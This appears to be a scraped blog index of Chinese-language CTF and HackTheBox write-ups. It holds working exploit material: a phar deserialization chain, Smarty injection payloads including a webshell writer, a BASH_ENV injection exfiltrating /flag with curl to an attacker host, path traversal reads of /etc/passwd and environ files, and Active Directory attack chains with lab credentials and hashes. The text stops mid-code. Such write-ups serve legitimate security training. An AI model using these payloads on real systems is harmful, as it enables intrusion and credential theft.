https://blog.csdn.net/Little_jcak/article/details/123516439","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HMGCTF2022-FanWebsite","slug":"CTF5-HMGCTF2022-FanWebsite","date":"2023-08-17T11:00:00.000Z","updated":"2023-09-26T02:26:08.110Z","comments":true,"path":"posts/15d824d9.html","link":"","permalink":"https://wa0er.github.io/posts/15d824d9.html","excerpt":"","text":"HMGCTF2022-FanWebsite知识点概要：phar反序列化 题目首页 www.zip源码泄露 主页面标题是Laminas MVC Skeleton，说明是Laminas MVC架构的框架 MVC框架先看路由，在www/module/Album/src/Controller/AlbumController.php &lt;?php namespace Album\\Controller; use Album\\Model\\AlbumTable; use Laminas\\Mvc\\Controller\\AbstractActionController; use Laminas\\View\\Model\\ViewModel; use Album\\Form\\AlbumForm; use Album\\Form\\UploadForm; use Album\\Model\\Album; class AlbumController extends AbstractActionController { // Add this property: private $table; private $white_list; public function __construct(AlbumTable $table){ $this-&gt;table = $table; $this-&gt;white_list = array('.jpg','.jpeg','.png'); } public function indexAction() { return new ViewModel([ 'albums' =&gt; $this-&gt;table-&gt;fetchAll(), ]); } public function addAction() { $form = new AlbumForm(); $form-&gt;get('submit')-&gt;setValue('Add'); $request = $this-&gt;getRequest(); if (! $request-&gt;isPost()) { return ['form' =&gt; $form]; } $album = new Album(); $form-&gt;setInputFilter($album-&gt;getInputFilter()); $form-&gt;setData($request-&gt;getPost()); if (! $form-&gt;isValid()) { return ['form' =&gt; $form]; } $album-&gt;exchangeArray($form-&gt;getData()); $this-&gt;table-&gt;saveAlbum($album); return $this-&gt;redirect()-&gt;toRoute('album'); } public function editAction() { $id = (int) $this-&gt;params()-&gt;fromRoute('id', 0); if (0 === $id) { return $this-&gt;redirect()-&gt;toRoute('album', ['action' =&gt; 'add']); } // Retrieve the album with the specified id. Doing so raises // an exception if the album is not found, which should result // in redirecting to the landing page. try { $album = $this-&gt;table-&gt;getAlbum($id); } catch (\\Exception $e) { return $this-&gt;redirect()-&gt;toRoute('album', ['action' =&gt; 'index']); } $form = new AlbumForm(); $form-&gt;bind($album); $form-&gt;get('submit')-&gt;setAttribute('value', 'Edit'); $request = $this-&gt;getRequest(); $viewData = ['id' =&gt; $id, 'form' =&gt; $form]; if (! $request-&gt;isPost()) { return $viewData; } $form-&gt;setInputFilter($album-&gt;getInputFilter()); $form-&gt;setData($request-&gt;getPost()); if (! $form-&gt;isValid()) { return $viewData; } $this-&gt;table-&gt;saveAlbum($album); // Redirect to album list return $this-&gt;redirect()-&gt;toRoute('album', ['action' =&gt; 'index']); } public function deleteAction() { $id = (int) $this-&gt;params()-&gt;fromRoute('id', 0); if (!$id) { return $this-&gt;redirect()-&gt;toRoute('album'); } $request = $this-&gt;getRequest(); if ($request-&gt;isPost()) { $del = $request-&gt;getPost('del', 'No'); if ($del == 'Yes') { $id = (int) $request-&gt;getPost('id'); $this-&gt;table-&gt;deleteAlbum($id); } // Redirect to list of albums return $this-&gt;redirect()-&gt;toRoute('album'); } return [ 'id' =&gt; $id, 'album' =&gt; $this-&gt;table-&gt;getAlbum($id), ]; } public function imgdeleteAction() { $request = $this-&gt;getRequest(); if(isset($request-&gt;getPost()['imgpath'])){ $imgpath = $request-&gt;getPost()['imgpath']; $base = substr($imgpath,-4,4); if(in_array($base,$this-&gt;white_list)){ //白名单 @unlink($imgpath); }else{ echo 'Only Img File Can Be Deleted!'; } } } public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-&gt;getRequest(); if ($request-&gt;isPost()) { // Make certain to merge the $_FILES info! $post = array_merge_recursive( $request-&gt;getPost()-&gt;toArray(), $request-&gt;getFiles()-&gt;toArray() ); $form-&gt;setData($post); if ($form-&gt;isValid()) { $data = $form-&gt;getData(); $base = substr($data[\"image-file\"][\"name\"],-4,4); if(in_array($base,$this-&gt;white_list)){ //白名单限制 $cont = file_get_contents($data[\"image-file\"][\"tmp_name\"]); if (preg_match(\"/&lt;\\?|php|HALT\\_COMPILER/i\", $cont )) { die(\"Not This\"); } if($data[\"image-file\"][\"size\"]&lt;3000){ die(\"The picture size must be more than 3kb\"); } $img_path = realpath(getcwd()).'/public/img/'.md5($data[\"image-file\"][\"name\"]).$base; echo $img_path; $form-&gt;saveImg($data[\"image-file\"][\"tmp_name\"],$img_path); }else{ echo 'Only Img Can Be Uploaded!'; } // Form is valid, save the form! //return $this-&gt;redirect()-&gt;toRoute('upload-form/success'); } } return ['form' =&gt; $form]; } } 有一个文件上传功能 public function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-&gt;getRequest(); if ($request-&gt;isPost()) { // Make certain to merge the $_FILES info! $post = array_merge_recursive( $request-&gt;getPost()-&gt;toArray(), $request-&gt;getFiles()-&gt;toArray() ); $form-&gt;setData($post); if ($form-&gt;isValid()) { $data = $form-&gt;getData(); $base = substr($data[\"image-file\"][\"name\"],-4,4); if(in_array($base,$this-&gt;white_list)){ //白名单限制 $cont = file_get_contents($data[\"image-file\"][\"tmp_name\"]); if (preg_match(\"/&lt;\\?|php|HALT\\_COMPILER/i\", $cont )) { die(\"Not This\"); } if($data[\"image-file\"][\"size\"]&lt;3000){ die(\"The picture size must be more than 3kb\"); } $img_path = realpath(getcwd()).'/public/img/'.md5($data[\"image-file\"][\"name\"]).$base; echo $img_path; $form-&gt;saveImg($data[\"image-file\"][\"tmp_name\"],$img_path); }else{ echo 'Only Img Can Be Uploaded!'; } // Form is valid, save the form! //return $this-&gt;redirect()-&gt;toRoute('upload-form/success'); } } return ['form' =&gt; $form]; } 白名单限制只能.jpg .jpeg .png三种后缀，有一个正则过滤phar文件\"/&lt;\\?|php|HALT\\_COMPILER/i\" 找利用点，在imgdeleteAction()有@unlink($imgpath);，可以触发phar反序列化，原理是unlink()函数在通过phar://伪协议解析phar文件时，会将meta-data进行反序列化 public function imgdeleteAction() { $request = $this-&gt;getRequest(); if(isset($request-&gt;getPost()['imgpath'])){ $imgpath = $request-&gt;getPost()['imgpath']; $base = substr($imgpath,-4,4); if(in_array($base,$this-&gt;white_list)){ //白名单 @unlink($imgpath); }else{ echo 'Only Img File Can Be Deleted!'; } } } 构造如下exploit，本地php环境运行即会自动在当前目录生成phar.phar文件（笔者此处用的是phpstudy集成环境） 注意：要将php.ini中phar.readonly选项设置为Off，否则无法生成phar文件 &lt;?php namespace Laminas\\View\\Resolver{ class TemplateMapResolver{ protected $map = [\"setBody\"=&gt;\"system\"]; } } namespace Laminas\\View\\Renderer{ class PhpRenderer{ private $__helpers; function __construct(){ $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); } } } namespace Laminas\\Log\\Writer{ abstract class AbstractWriter{} class Mail extends AbstractWriter{ protected $eventsToMail = [\"cat /flag\"]; protected $subjectPrependText = null; protected $mail; function __construct(){ $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); } } } namespace Laminas\\Log{ class Logger{ protected $writers; function __construct(){ $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; } } } namespace{ $a = new \\Laminas\\Log\\Logger(); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(\"test.txt\", \"test\"); $phar-&gt;stopBuffering(); } 用xxd查看生成的phar文件16进制编码，在ASCII码侧可看到meta-data部分序列化的数据 由于会对phar文件的静态特征进行正则过滤，所以可以先gzip压缩，再修改后缀为.png，以此绕过正则过滤 参考：https://www.freebuf.com/articles/web/291992.html imguploadAction()要求上传文件大小必须大于3kb，那么我们可以用16进制编辑器再将文件填充到大于3kb if($data[\"image-file\"][\"size\"]&lt;3000){ die(\"The picture size must be more than 3kb\"); } 在/album/imgupload上传修改好的png文件，返回图片的路径 然后在/album/imgdelete用phar伪协议访问图片地址，从而用unlink()函数触发phar反序列化 phar:///var/www/public/img/a9a9ccc55eab0928c1f05e1647a12575.png 点击提交，则成功获取flag 参考https://blog.csdn.net/m0_51078229/article/details/123660344 https://www.freebuf.com/articles/web/291992.html","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HMGCTF2022-SmartyCalculator","slug":"CTF4-HMGCTF2022-SmartyCalculator","date":"2023-08-13T11:00:00.000Z","updated":"2023-09-26T02:26:08.108Z","comments":true,"path":"posts/e61f7f25.html","link":"","permalink":"https://wa0er.github.io/posts/e61f7f25.html","excerpt":"","text":"HMGCTF2022-SmartyCalculator知识点概要：Smarty模板注入 主页 随便输入会弹窗提示：你还没有登录 www.zip源码泄露，Smarty框架 index.php发现弹窗逻辑代码 绕过弹窗，需要：1. POST传入data参数；2. Cookie要有login字段 然后还要绕过waf对data参数的限制（不能有php、&lt;、flag、?），才能进入Smart模板 题目Smarty版本是3.1.39 思路1https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html 从官方下载对应版本：https://github.com/smarty-php/smarty/releases?q=3.1.39&amp;expanded=true 对比发现smarty_internal_compile_function.php有改动（此处对比工具为Beyond Compare） 关键的差异只有一处正则（左侧为题目源码，右侧为官方源码） preg_match('/[a-zA-Z0-9_\\x80-\\xff](.*)+$/', $_name) 题目正则逻辑分析： [a-zA-Z0-9_\\x80-\\xff]匹配字母、数字、下划线或0x80-0xff范围内的任意字节，作为开头字符。 (.*)+匹配0次或多次(*)任意数量(+)除换行符\\n之外的任意单字符(.)。 $匹配字符串的结束。 其中正则里\\x80-\\xff表示匹配utf-8编码下所有的汉字 所以可以换行绕过，%0A既不在前面的[]匹配里面，又不被后面的.匹配 所以只需要在原来poc基础上，加上%0A绕过即可（实际测试发现需要两个字符，且只要第一个字符是%0A皆可，此处用%0A%0A） data={function+name='rce(){};system(\"id\");function%0A%0A'}{/function} HackBar传参如下 执行phpinfo() data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=phpinfo(); 读flag data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=var_dump(file_get_contents('/flag')); 思路2function.math.php文件里有eval()函数可以命令执行，回溯$equation变量有个正则匹配 preg_match_all('!(?:0x[a-fA-F0-9]+)|([a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*)!', $equation, $match); 正则逻辑分析如下： preg_match_all()函数使用正则表达式匹配$equation字符串； 模式使用! !作为定界符； 第一部分 (?:0x[a-fA-F0-9]+) 匹配十六进制数，?:表示不捕获； 第二部分([a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*)捕获变量名模式（以字母/下划线/0x7f-0xff范围内的字符开头，后跟0个或多个字母/数字/指定字符的模式）。 |表示或，匹配两种模式之一。 结果存储在$match数组中。 第一部分不捕获，第二部分捕获的变量名存入 $match[1]。 这样可以检索出字符串中的变量名，进行后续处理。 根据上述逻辑，此处可通过八进制绕过正则 脚本如下 s = input(\"请输入字符串:\") res = \"\" for c in s: if c == \"(\" or c == \")\" or c == \",\": res += c elif c == \"\\\"\": res += \"\\\\\" + c else: o = oct(ord(c)) res += \"\\\\\\\\\" + o[2:] print(res) 如下命令写入一句话木马 (\"file_put_contents\")(\"wa0er.php\",\"&lt;?php eval($_POST[wa0er]);?&gt;\") 处理成八进制后，完整Payload如下 data={$poc=\"poc\"}{math equation=\"(\\\"\\\\146\\\\151\\\\154\\\\145\\\\137\\\\160\\\\165\\\\164\\\\137\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\163\\\")(\\\"\\\\167\\\\141\\\\60\\\\145\\\\162\\\\56\\\\160\\\\150\\\\160\\\",\\\"\\\\74\\\\77\\\\160\\\\150\\\\160\\\\40\\\\145\\\\166\\\\141\\\\154(\\\\44\\\\137\\\\120\\\\117\\\\123\\\\124\\\\133\\\\167\\\\141\\\\60\\\\145\\\\162\\\\135)\\\\73\\\\77\\\\76\\\")\"} HackBar传参如下 蚁剑连接，flag在根目录 参考https://blog.csdn.net/m0_51078229/article/details/123660344 https://xz.aliyun.com/t/11085 https://blog.csdn.net/RABCDXB/article/details/123750375","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-Active","slug":"HTB13-Active-Easy","date":"2023-08-12T08:24:00.000Z","updated":"2023-08-20T08:41:27.417Z","comments":true,"path":"posts/79fbfa03.html","link":"","permalink":"https://wa0er.github.io/posts/79fbfa03.html","excerpt":"","text":"HTB-Active一、思路概要主要工具： smbmap：查看SMB共享服务信息 smbclient：连接SMB服务 gpp-decrypt：解密主机密码 impacket-GetUserSPNs：获取SPN信息 impacket-psexec：登录主机，获取shell 二、信息收集nmap扫端口服务 nmap -p- --min-rate 10000 -Pn -sT 10.10.10.100 nmap -A 10.10.10.100 用smbmap查看SMB共享服务 smbmap -H 10.10.10.100 SMB共享出来的Replication目录有只读权限，用smbclient匿名连接一下 smbclient //10.10.10.100/Replication -N 在如下目录，找到Groups.xml文件，没法直接读，尝试把它下载到本地kali（Groups.xml作用可以理解为域内主机的配置文件） cd active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\ smb连接窗口执行如下命令 get Groups.xml 本地kali执行如下命令 cat Groups.xml 看到主机用户和密码，用gpp-decrypt解密 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 尝试以admin用户连接smb服务，失败 smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/ADMIN$ 以普通用户连接smb服务，成功 smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/USERS 读user.txt cd SVC_TGS\\Desktop\\ get user.txt 三、权限提升用如下命令获取SPN成功 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request 数据是john可以爆破的格式，直接john爆破，得Administrator密码 john --wordlist=/usr/share/wordlists/rockyou.txt SPN.txt 用Administrator账户登录主机，成功获取system权限 impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 读root.txt，Over！ type C:\\Users\\Administrator\\Desktop\\root.txt 参考https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"LineCTF2022-BB","slug":"CTF3-LineCTF2022-BB","date":"2023-08-09T11:00:00.000Z","updated":"2023-09-26T02:26:08.107Z","comments":true,"path":"posts/b6fd9de0.html","link":"","permalink":"https://wa0er.github.io/posts/b6fd9de0.html","excerpt":"","text":"LineCTF2022-BB知识点概要：环境变量注入 主页显示源码 &lt;?php error_reporting(0); function bye($s, $ptn){ if(preg_match($ptn, $s)){ #$s中有$ptn则返回false return false; } return true; } foreach($_GET[\"env\"] as $k=&gt;$v){ #遍历env变量键值对，键给$k，值给$v if(bye($k, \"/=/i\") &amp;&amp; bye($v, \"/[a-zA-Z]/i\")) { putenv(\"{$k}={$v}\"); #键过滤等号，值过滤大小写字母 } } system(\"bash -c 'imdude'\"); foreach($_GET[\"env\"] as $k=&gt;$v){ if(bye($k, \"/=/i\")) { putenv(\"{$k}\"); } } highlight_file(__FILE__); ?&gt; 关键代码如下 foreach($_GET[\"env\"] as $k=&gt;$v){ #遍历env变量键值对，键给$k，值给$v if(bye($k, \"/=/i\") &amp;&amp; bye($v, \"/[a-zA-Z]/i\")) { putenv(\"{$k}={$v}\"); #键过滤等号，值过滤大小写字母 } } system(\"bash -c 'imdude'\"); 参考P神两篇文章 https://twitter.com/phithon_xg/status/1495367705825722368 https://tttang.com/archive/1450/#toc_0x06-bash_env 利用如下环境变量注入 BASH_ENV='$(id 1&gt;&amp;2)' bash -c 'echo hello' 这个Bash命令的执行过程是: 设置BASH_ENV环境变量，其值为 ‘$(id 1&gt;&amp;2)’ 该环境变量会在新bash shell启动时被执行 bash -c ‘echo hello’ 会启动一个新的非交互式的bash shell 在该shell启动时，会先执行BASH_ENV变量的值 ‘$(id 1&gt;&amp;2)’ 该代码会执行id命令，并将输出重定向到标准错误流stderr 然后再执行echo hello，输出hello到标准输出流stdout 该子shell执行完成后退出 所以命令的最终效果是： 在标准错误流中输出id命令的用户信息，在标准输出流中输出hello 这利用了BASH_ENV变量在启动新bash shell时会被执行的特性。这样可以在新shell执行前，通过BASH_ENV注入预设的代码。 另外，为了绕过bye()函数对大小写字母的过滤，可用八进制的格式替换字母 例如$'\\101' = A 用python替换就是先将字母转成十进制再转成八进制 &gt;&gt;&gt; oct(ord(\"A\")) '0o101' 再从第三位截取到末尾 &gt;&gt;&gt; oct(ord(\"A\"))[2:] '101' 执行命令要考虑中间的空格问题，空格也进行转换，执行命令会报错 cat /flag可以被转换成如下两种格式 $'\\143\\141\\164' /$'\\146\\154\\141\\147' 或 $'\\143'$'\\141'$'\\164' /$'\\146'$'\\154'$'\\141'$'\\147' 两种格式都可顺利被执行 但为了写脚本方便，选用第二种格式，只需对每个小写字母统一处理。脚本如下 import string cmd = \"cat /flag | curl -d @- http://x.x.x.x:9876\" str = '' for i in cmd: if i in string.ascii_lowercase: j = oct(ord(i))[2:] str += \"$'\\\\\"+j+\"'\" else: str+=i print(str) 命令解释： curl -d @- http://x.x.x.x:9876 #通过POST方式发送数据到指定的URL 最终payload，GET传参（记得先在自己的x.x.x.x开启监听） ?env[BASH_ENV]=`$'\\143'$'\\141'$'\\164' /$'\\146'$'\\154'$'\\141'$'\\147' | $'\\143'$'\\165'$'\\162'$'\\154' -$'\\144' @- $'\\150'$'\\164'$'\\164'$'\\160'://x.x.x.x:9876` 参考https://blog.csdn.net/RABCDXB/article/details/125351004 https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-Forest","slug":"HTB12-Forest-Easy","date":"2023-08-06T08:33:00.000Z","updated":"2023-08-20T08:40:29.698Z","comments":true,"path":"posts/9ab855b5.html","link":"","permalink":"https://wa0er.github.io/posts/9ab855b5.html","excerpt":"","text":"HTB-Forest一、思路概要主要工具： rpcclient：建立null session并执行enumdomusers列举域内用户 ldapsearch：列举域内用户 impacket-GetNPUsers：枚举用户信息 crackmapexec：登录smb或winrm服务 evil-winrm：登录winrm服务 bloodhound-python：获取Active Directory信息 impacket-secretsdump：把Administrator的hash给dump下来（hash转储） 二、信息收集nmap扫描 nmap -A 10.10.10.161 开放的端口服务挺多的，避免遗漏，再用如下命令扫一遍 nmap -p- --min-rate 10000 -Pn -sT 10.10.10.161 nmap -p- --min-rate 10000 -Pn -sU 10.10.10.161 三、RPCBind用rpcclient建立null session（即不需要用户名和口令），并执行命令列举域内用户 rpcclient -U \"\" -N -c enumdomusers 10.10.10.161 其中有一些SM_和HealthMailbox开头的用户是微软Exchange邮件服务相关用户，可以忽略 另一种列举域内用户的方法是用ldapsearch，如下命令 ldapsearch -x -b \"dc=htb,dc=local\" \"*\" -H ldap://10.10.10.161 | grep userPrincipalName -T 然后我们把用户保存到一个txt文件中 四、AS-REP Roasting用impacket-GetNPUsers枚举用户信息 impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 获取到svc-alfresco用的的hash，保存到一个txt文件中 $krb5asrep$23$svc-alfresco@HTB.LOCAL:0f16da7878199001a313c8d8fa5f4954$c12e97e4c0dc193904026abe565b276765c563f613e0a802e4ab5b567c6dc280194233cbbdc40813f6419cbb3072815f488be8c4af44646a46c02119c901099b34a562e0f18751b39b2de2ef108a5ee09d9131849e9fe5169e51ee585ae604810cd154f010fbd3b6a00c31e982ff23242c86d4e00c3c0e97ada71e93241f798e6ca453b3850807795d2b7910c7cfb56a9ec53b5b1425470b9a9408bb71c02456f7540c7d9d9c48687cc935a99d8c9799e0ad16022119ce88ecb84666393d1c91bdf26470464171641c6525c5d3026ce06bed360a6ca93305275419d1f478f10a92a8d006a23e 用john指定字典，爆破hash john -w=/usr/share/wordlists/rockyou.txt hash.txt 爆破成功，用户名及口令已知，用crackmapexec验证此账户 crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local 验证成功，确认此账户正确 五、WinRM然后把smb更换成winrm，看是否有登录winrm服务的权限 crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local 确实有winrm服务的权限，用evil-winrm登录，如下图，登录成功 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 六、权限提升用bloodhound-python获取Active Directory信息 bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip 添加新用户wa0er，并把用户放到”Exchange Windows Permissions”用户组和”Remote Management Users”用户组 net user wa0er password /add /domain net group \"Exchange Windows Permissions\" wa0er /add net localgroup \"Remote Management Users\" wa0er /add 验证用户有效性 crackmapexec smb 10.10.10.161 -u wa0er -p 'password' -d htb.local 写DACL 本地kali开启http.server服务 python3 -m http.server 80 靶机evil-winrm窗口依次执行如下命令 (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX $SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('htb.local\\wa0er', $SecPass) Add-ObjectACL -PrincipalIdentity wa0er -Credential $Cred -Rights DCSync 现在用户wa0er有了DCSync权限 用impacket-secretsdump把Administrator的hash给dump下来（hash转储） impacket-secretsdump htb.local/wa0er@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm 用crackmapexec和传递Administrator的hash，执行命令 crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x \"dir C:\\Users\\Administrator\\Desktop\" 会有一些报错，但无伤大雅 可看到成功以Administrator身份执行任意命令 参考https://axcheron.github.io/writeups/htb/forest/","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"LineCTF2022-MemoDrive","slug":"CTF2-LineCTF2022-MemoDrive","date":"2023-08-05T11:00:00.000Z","updated":"2023-09-26T02:26:08.106Z","comments":true,"path":"posts/e7bee0fc.html","link":"","permalink":"https://wa0er.github.io/posts/e7bee0fc.html","excerpt":"","text":"LineCTF2022-MemoDrive知识点概要：CVE-2021-23336、目录遍历 详情参考：urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator 首页 有源码，关键代码如下 def view(request): context = {} try: context['request'] = request clientId = getClientID(request.client.host) #getClientID()为题目源码的函数，做了一个hash运算 if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename f = open(path, 'r') contents = f.readlines() f.close() context['filename'] = filename context['contents'] = contents except: pass return templates.TemplateResponse('/view/view.html', context) def getClientID(ip): key = ip + '_' + os.getenv('SALT') return hashlib.md5(key.encode('utf-8')).hexdigest() 第15行全场唯一读文件方法readlines()，只需让path变量为flag所在路径即可 按照题目源码框架，本地启一个环境测试一下，代码如下 from urllib.parse import unquote import uvicorn from starlette.applications import Starlette from starlette.routing import Route from starlette.responses import JSONResponse def view(request): try: clientId = \"id\" print(\"request.url:\", request.url) print(\"request.url.query:\", request.url.query) print(\"request.query_params:\", request.query_params) print(\"unquote params:\", unquote(request.query_params[clientId])) if '&amp;' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]): raise filename = request.query_params[clientId] print(\"filename:\", filename) print(\"request.query_params.keys:\", request.query_params.keys()) path = './memo/' + \"\".join(request.query_params.keys()) + '/' + filename print(\"path:\", path) except: pass return JSONResponse({\"a\":1}) routes = [ Route('/view', endpoint=view) ] app = Starlette(debug=True, routes=routes) if __name__ == \"__main__\": uvicorn.run(app, host=\"0.0.0.0\", port=11000) 浏览器访问 http://192.168.1.34:11000/view?id=flag;/%2e%2e 在部分python版本中，解析URL参数时，会将分号;解析成参数分隔符&amp;，从而导致此题目可被利用 参考：urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator 实际操作如下 先在首页上侧的文本框随便输入，点击SAVE 然后下侧文本框会显示一串数字，就是序号+时间戳生成的文件名，点击进去 可看到URL跳转到/view?5e9995136241f179475b3f35dab141a4=0_20230907112045 修改为如下，假flag（必须先走完上面的步骤，直接访问此路径无回显） /view?5e9995136241f179475b3f35dab141a4=flag;/%2e%2e 等号后修改为如下，读/etc/passwd etc/passwd;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e 源码getClientID()函数里有读取环境变量的代码os.getenv('SALT')，那么可以尝试读当前进程的环境变量信息/proc/self/environ，等号后修改为如下 proc/self/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e 已经可以看到SALT环境变量，但提示flag不在此 读进程 ID 为 1 的进程环境变量/proc/1/environ，等号后修改为如下 proc/1/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e 参考https://blog.huli.tw/2022/03/27/linectf-2022-writeup/ https://blog.csdn.net/weixin_60581972/article/details/127122199","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"LineCTF2022-gotm","slug":"CTF1-LineCTF2022-gotm","date":"2023-08-01T11:00:00.000Z","updated":"2023-09-26T02:28:06.751Z","comments":true,"path":"posts/4e3093bf.html","link":"","permalink":"https://wa0er.github.io/posts/4e3093bf.html","excerpt":"","text":"LineCTF2022-gotm知识点概要：SSTI模板注入、JWT伪造 题目给出了go源码（末尾有完整代码） Account结构体，主要就四个属性 type Account struct { id string pw string is_admin bool secret_key string } 注册功能：http.HandleFunc(\"/regist\", regist_handler) func regist_handler(w http.ResponseWriter, r *http.Request) { uid := r.FormValue(\"id\") #读取参数id值 upw := r.FormValue(\"pw\") #读取参数pw值 if uid == \"\" || upw == \"\" { #判断id和pw是否为空 return } if get_account(uid).id != \"\" { #根据id判断，若用户已存在，报错 w.WriteHeader(http.StatusForbidden) return } if len(acc) &gt; 4 { clear_account() } new_acc := Account{uid, upw, false, secret_key} #创建账户的四个属性，只有id和pw可控 acc = append(acc, new_acc) p := Resp{true, \"\"} res, err := json.Marshal(p) if err != nil { } w.Write(res) return } 注册用户传参如下，注册成功 /regist?id=2&amp;pw=password get_account()函数 func get_account(uid string) Account { for i := range acc { if acc[i].id == uid { return acc[i] } } return Account{} } acc在代码前面的定义是var acc []Account，是全局数组变量 登录认证功能：http.HandleFunc(\"/auth\", auth_handler) func auth_handler(w http.ResponseWriter, r *http.Request) { uid := r.FormValue(\"id\") upw := r.FormValue(\"pw\") if uid == \"\" || upw == \"\" { return } if len(acc) &gt; 1024 { clear_account() } user_acc := get_account(uid) if user_acc.id != \"\" &amp;&amp; user_acc.pw == upw { token, err := jwt_encode(user_acc.id, user_acc.is_admin) #生成jwt if err != nil { return } p := TokenResp{true, token} #返回jwt res, err := json.Marshal(p) if err != nil { } w.Write(res) return } w.WriteHeader(http.StatusForbidden) return } 用刚才注册的账户认证，认证成功，返回jwt /auth?id=2&amp;pw=password {\"status\":true,\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc19hZG1pbiI6ZmFsc2V9.e418r9xtLSloAZhbw0hbSa-xOF03AqyBoovOzWRkHoA\"} SSTI漏洞产生位置：http.HandleFunc(\"/\", root_handler) func root_handler(w http.ResponseWriter, r *http.Request) { token := r.Header.Get(\"X-Token\") if token != \"\" { id, _ := jwt_decode(token) #从jwt中解析出id属性 acc := get_account(id) #根据id，查找账户 tpl, err := template.New(\"\").Parse(\"Logged in as \" + acc.id) #acc.id存在SSTI if err != nil { } tpl.Execute(w, &amp;acc) } else { return } } flag读取功能：http.HandleFunc(\"/flag\", flag_handler) func flag_handler(w http.ResponseWriter, r *http.Request) { token := r.Header.Get(\"X-Token\") if token != \"\" { id, is_admin := jwt_decode(token) #从jwt解析出id和is_admin属性 if is_admin == true { #判断is_admin属性为true才可以返回flag p := Resp{true, \"Hi \" + id + \", flag is \" + flag} res, err := json.Marshal(p) if err != nil { } w.Write(res) return } else { w.WriteHeader(http.StatusForbidden) return } } } 根据regist_handler()，我们知道注册账户时，默认给的is_admin属性为false 此处要让flag_handler()返回flag，我们需要通过伪造jwt把is_admin属性修改为true 又由于jwt编码过程中需要用到secret_key作签名密钥，secret_key是环境变量，就需要通过SSTI漏洞把secret_key读出来 secret_key定义： var secret_key = os.Getenv(\"KEY\") jwt_encode()函数： func jwt_encode(id string, is_admin bool) (string, error) { claims := AccountClaims{ id, is_admin, jwt.StandardClaims{}, } token := jwt.NewWithClaims(jwt.SigningMethodHS256, 